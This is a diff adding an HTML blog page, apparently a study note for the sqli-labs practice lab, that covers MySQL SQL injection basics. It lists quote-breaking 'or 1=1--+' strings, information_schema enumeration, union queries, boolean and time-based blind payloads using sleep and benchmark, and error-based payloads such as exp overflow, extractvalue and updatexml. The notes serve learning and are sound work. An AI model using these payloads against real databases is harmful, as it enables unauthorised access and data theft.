@@ -1,0 +1,548 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>sqli-labs 基础知识 | Gridea</title>
+<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="sqli-labs 基础知识 | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="系统函数
+mysql&gt; select version();
++-----------+
+| version() |
++-----------+
+| 5.7.25    |
++-----------+
+1 row in set (0.0..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              sqli-labs 基础知识
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-04-06
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p><strong>系统函数</strong></p>
+<pre><code>mysql&gt; select version();
++-----------+
+| version() |
++-----------+
+| 5.7.25    |
++-----------+
+1 row in set (0.00 sec)
+
+mysql&gt; select user();
++----------------+
+| user()         |
++----------------+
+| root@localhost |
++----------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select database();
++------------+
+| database() |
++------------+
+| security   |
++------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select @@datadir;
++-----------------------------------+
+| @@datadir                         |
++-----------------------------------+
+| D:\mysql-5.7.25-winx64\data\ |
++-----------------------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select @@version_compile_os;
++----------------------+
+| @@version_compile_os |
++----------------------+
+| Win64                |
++----------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select @@basedir;
++------------------------------+
+| @@basedir                    |
++------------------------------+
+| D:\mysql-5.7.25-winx64\ |
++------------------------------+
+1 row in set (0.00 sec)
+</code></pre>
+<p><strong>字符串连接函数</strong></p>
+<pre><code># concat没有分隔符地连接字符串
+mysql&gt; select concat(&quot;s&quot;, &quot;elect&quot;);
++----------------------+
+| concat(&quot;s&quot;, &quot;elect&quot;) |
++----------------------+
+| select               |
++----------------------+
+1 row in set (0.00 sec)
+
+#  concat_ws 有分隔符地连接字符串
+mysql&gt; select concat_ws(&quot;,&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;);
++-------------------------------+
+| concat_ws(&quot;,&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;) |
++-------------------------------+
+| a,b,c                         |
++-------------------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select concat_ws(&quot;|&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;);
++-------------------------------+
+| concat_ws(&quot;|&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;) |
++-------------------------------+
+| a|b|c                         |
++-------------------------------+
+1 row in set (0.00 sec)
+
+# group_concat连接一个组的所有字符串，并以逗号分隔每一条数据
+mysql&gt; select group_concat(username) from users;
++---------------------------------------------------------+
+| group_concat(username)                                  |
++---------------------------------------------------------+
+| Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin |
++---------------------------------------------------------+
+1 row in set (0.02 sec)
+</code></pre>
+<p><strong>information_schema</strong></p>
+<pre><code># 获取所有数据库
+select schema_name from information_schema.SCHEMATA;
+
+# 获取表名
+select table_name from information_schema.tables WHERE table_schema=database();
+
+# 查看所有字段
+select group_concat(column_name) FROM information_schema.columns WHERE table_name='user';
+</code></pre>
+<p><strong>一般用于替换的语句</strong></p>
+<pre><code>or 1=1--+
+'or 1=1--+
+&quot;or 1=1--+
+)or 1=1--+
+')or 1=1--+
+&quot;) or 1=1--+
+&quot;))or 1=1--+
+</code></pre>
+<p>一般GET请求中的+会自动替换为空格，还可以用%20来代替空格。<br>
+使用#注释，可以编码为%23，因为url中的#与sql中的注释#冲突，一般不会直接把#传到服务端。<br>
+<strong>union 操作符</strong></p>
+<p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。但是UNION 内部的 SELECT 语句必须拥有相同数量的列。<br>
+默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p>
+<pre><code>mysql&gt; (select id, username from users limit 1) union (select 1, 2);
++----+----------+
+| id | username |
++----+----------+
+|  1 | Dumb     |
+|  1 | 2        |
++----+----------+
+2 rows in set (0.00 sec)
+mysql&gt; (select id, username from users limit 1) union (select username, id from users limit 1);
++------+----------+
+| id   | username |
++------+----------+
+| 1    | Dumb     |
+| Dumb | 1        |
++------+----------+
+2 rows in set (0.00 sec)
+
+mysql&gt; (select id, username from users limit 1) union (select id,username from users limit 1);
++----+----------+
+| id | username |
++----+----------+
+|  1 | Dumb     |
++----+----------+
+1 row in set (0.00 sec)
+
+mysql&gt; (select id, username from users limit 1) union all (select id,username from users limit 1);
++----+----------+
+| id | username |
++----+----------+
+|  1 | Dumb     |
+|  1 | Dumb     |
++----+----------+
+2 rows in set (0.00 sec)
+</code></pre>
+<p><strong>正则</strong></p>
+<pre><code>mysql&gt; select username from users WHERE username regexp '^D';
++----------+
+| username |
++----------+
+| Dumb     |
+| Dummy    |
++----------+
+2 rows in set (0.01 sec)
+
+mysql&gt; select user() regexp '^r';
++--------------------+
+| user() regexp '^r' |
++--------------------+
+|                  1 |
++--------------------+
+1 row in set (0.00 sec)
+</code></pre>
+<p><strong>逻辑判断</strong></p>
+<pre><code>mysql&gt; select left(database(), 1)= 's';
++--------------------------+
+| left(database(), 1)= 's' |
++--------------------------+
+|                        1 |
++--------------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select left(database(), 1)&gt; 's';
++--------------------------+
+| left(database(), 1)&gt; 's' |
++--------------------------+
+|                        0 |
++--------------------------+
+1 row in set (0.00 sec)
+</code></pre>
+<p><strong>逻辑判断</strong></p>
+<pre><code>mysql&gt; SELECT ascii(substr(&quot;emails&quot;, 1, 1));
++-------------------------------+
+| ascii(substr(&quot;emails&quot;, 1, 1)) |
++-------------------------------+
+|                           101 |
++-------------------------------+
+1 row in set (0.00 sec)
+
+# ascii和ord函数一样，将字符转为 ascii 值
+# substr和mid函数一样
+mysql&gt; SELECT ord(substr(&quot;emails&quot;, 1, 1));
++-----------------------------+
+| ord(substr(&quot;emails&quot;, 1, 1)) |
++-----------------------------+
+|                         101 |
++-----------------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; SELECT ascii(substr((select table_name from information_schema.tables where table_schema =database() limit 1), 1, 1));
++----------------------------------------------------------------------------------------------------------------+
+| ascii(substr((select table_name from information_schema.tables where table_schema =database() limit 1), 1, 1)) |
++----------------------------------------------------------------------------------------------------------------+
+|                                                                                                            101 |
++----------------------------------------------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; SELECT ascii(substr((select table_name from information_schema.tables where table_schema =database() limit 1), 1, 1))=101;
++--------------------------------------------------------------------------------------------------------------------+
+| ascii(substr((select table_name from information_schema.tables where table_schema =database() limit 1), 1, 1))=101 |
++--------------------------------------------------------------------------------------------------------------------+
+|                                                                                                                  1 |
++--------------------------------------------------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; SELECT ord(mid((select table_name from information_schema.tables where table_schema =database() limit 1), 1, 1))=101;
++---------------------------------------------------------------------------------------------------------------+
+| ord(mid((select table_name from information_schema.tables where table_schema =database() limit 1), 1, 1))=101 |
++---------------------------------------------------------------------------------------------------------------+
+|                                                                                                             1 |
++---------------------------------------------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select ifnull(cast(username as char), 0x20) from users order by id limit 1;
++--------------------------------------+
+| ifnull(cast(username as char), 0x20) |
++--------------------------------------+
+| Dumb                                 |
++--------------------------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; SELECT ord(mid((select ifnull(cast(username as char), 0x20) from users order by id limit 1), 1, 1))=0x44;
++---------------------------------------------------------------------------------------------------+
+| ord(mid((select ifnull(cast(username as char), 0x20) from users order by id limit 1), 1, 1))=0x44 |
++---------------------------------------------------------------------------------------------------+
+|                                                                                                 1 |
++---------------------------------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+</code></pre>
+<p><strong>exp报错</strong></p>
+<pre><code>mysql&gt; select exp(709);
++-----------------------+
+| exp(709)              |
++-----------------------+
+| 8.218407461554972e307 |
++-----------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select exp(710);
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
+
+mysql&gt; select log(15);
++------------------+
+| log(15)          |
++------------------+
+| 2.70805020110221 |
++------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select ln(15);
++------------------+
+| ln(15)           |
++------------------+
+| 2.70805020110221 |
++------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select exp(2.70805020110221);
++-----------------------+
+| exp(2.70805020110221) |
++-----------------------+
+|                    15 |
++-----------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select ~0;
++----------------------+
+| ~0                   |
++----------------------+
+| 18446744073709551615 |
++----------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select ~(select version());
++----------------------+
+| ~(select version())  |
++----------------------+
+| 18446744073709551610 |
++----------------------+
+1 row in set, 1 warning (0.00 sec)
+
+mysql&gt; select exp(~(select*from(select user())x));
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
+</code></pre>
+<p><strong>exp报错注入</strong></p>
+<pre><code>mysql&gt; select exp(709);
++-----------------------+
+| exp(709)              |
++-----------------------+
+| 8.218407461554972e307 |
++-----------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select exp(710);
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
+
+mysql&gt; select log(15);
++------------------+
+| log(15)          |
++------------------+
+| 2.70805020110221 |
++------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select ln(15);
++------------------+
+| ln(15)           |
++------------------+
+| 2.70805020110221 |
++------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select exp(2.70805020110221);
++-----------------------+
+| exp(2.70805020110221) |
++-----------------------+
+|                    15 |
++-----------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select ~0;
++----------------------+
+| ~0                   |
++----------------------+
+| 18446744073709551615 |
++----------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select ~(select version());
++----------------------+
+| ~(select version())  |
++----------------------+
+| 18446744073709551610 |
++----------------------+
+1 row in set, 1 warning (0.00 sec)
+
+mysql&gt; select exp(~(select*from(select user())x));
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
+</code></pre>
+<p>参考：https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/<br>
+extractvalue(1,concat(0x7e,(select @@version),0x7e))<br>
+--+ mysql 对 xml 数据进 行查询和修改的 xpath 函数，xpath 语法错误<br>
+updatexml(1,concat(0x7e,(select @@version),0x7e),1)<br>
+--+ mysql 对 xml 数据进行 查询和修改的 xpath 函数，xpath 语法错误<br>
+select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;<br>
+--+ mysql 重复特性，此处重复了 version，所以报错<br>
+select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x<br>
+<strong>bigint注入</strong></p>
+<pre><code>mysql&gt; select exp(~(select*from(select user())x));
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
+</code></pre>
+<p>参考：https://osandamalith.com/2015/07/08/bigint-overflow-error-based-sql-injection/<br>
+<strong>基于时间的盲注</strong></p>
+<pre><code>mysql&gt; select if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5));
++----------------------------------------------------+
+| if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5)) |
++----------------------------------------------------+
+|                                                  0 |
++----------------------------------------------------+
+1 row in set (5.00 sec)
+
+mysql&gt; SELECT IF(SUBSTRING(database(),1,1)=char(115),BENCHMARK(5000000,ENCODE('M SG','by 5 seconds')),null);
++-----------------------------------------------------------------------------------------------+
+| IF(SUBSTRING(database(),1,1)=char(115),BENCHMARK(5000000,ENCODE('M SG','by 5 seconds')),null) |
++-----------------------------------------------------------------------------------------------+
+|                                                                                             0 |
++-----------------------------------------------------------------------------------------------+
+1 row in set, 65535 warnings (1.16 sec)
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://https://jinqipiaopiao.github.io/post/dvwa-zhi-command/">
+              <h3 class="post-title">
+                DVWA之Command Injection
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
